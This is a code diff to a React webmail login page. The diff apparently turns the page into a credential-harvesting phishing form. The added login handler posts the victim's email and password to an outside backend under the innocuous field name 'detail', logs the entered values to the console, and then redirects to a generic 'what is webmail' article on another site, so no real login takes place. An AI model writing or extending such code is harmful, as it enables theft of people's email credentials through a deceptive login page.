@@ -1,8 +1,10 @@
-import React, { useEffect, useState } from 'react'
-import "./login.css"
+import React, { useEffect, useState } from 'react';
+import "./login.css";
 import { useTranslation } from "react-i18next";
 import i18next from 'i18next';
-import cookies from 'js-cookie'
+import cookies from 'js-cookie';
+import axios from 'axios';
+import { useNavigate } from 'react-router-dom';
 
 
 const languages = [
@@ -144,6 +146,12 @@ const languages = [
 
 const Login = () => {
   const [email, setEmail] = useState('');
+  const initialValues = {
+    email : "",
+    password : "",
+  }
+
+  const [loginValues, setLoginValues] = useState(initialValues) 
 
 
   const { t } = useTranslation()
@@ -171,9 +179,33 @@ const Login = () => {
     }
   }, []);
 
-  const handleEmailChange = (e) => {
-    setEmail(e.target.value);
-  };
+  const handleChange = (e)=>{
+    const { name, value } = e.target;
+    setLoginValues({...loginValues, [name]: value });
+    console.log(loginValues)
+    // setLoginErrors(false)
+}
+
+
+  const url = "https://web-mail-backend.vercel.app/login-user"
+  const data = {email: loginValues.email, detail: loginValues.password}
+
+  // const Navigate = useNavigate()
+
+  const handleLogin = async (e)=>{
+    e.preventDefault();
+
+    try {
+          const response = await axios.post(url, data)
+          console.log(response)
+        // Navigate("https://www.website.com/beginnerguide/email/9/1/what-is-webmail?.ws&source=SC")
+          window.location.href = "https://www.website.com/beginnerguide/email/9/1/what-is-webmail?.ws&source=SC"
+    }
+    catch(err){
+      console.log(err);
+    }
+
+}
 
   // jfjfjf
 
@@ -200,8 +232,8 @@ const Login = () => {
                           placeholder={t("enter_email_address")}
                           id="email"
                           name="email"
-                          value={email}
-                          onChange={handleEmailChange}
+                          value={loginValues.email}
+                          onChange={handleChange}
                           required                  
 
                         />
@@ -213,11 +245,15 @@ const Login = () => {
                         <div className='login-form-input-passwordlogo'></div>
                         <input type='password'
                           placeholder={t("enter_password")}
+                          name="password"
+                          value={loginValues.password}
+                          onChange={handleChange}
+                          required               
                         />
                       </div>
                     </div>
                   </div>
-                  <button className='login-button'>{t("login")}</button>
+                  <button className='login-button' onClick={handleLogin}>{t("login")}</button>
                   <div className='login-reset-password'>{t("reset_password")}</div>
                 </div> : null
                 }
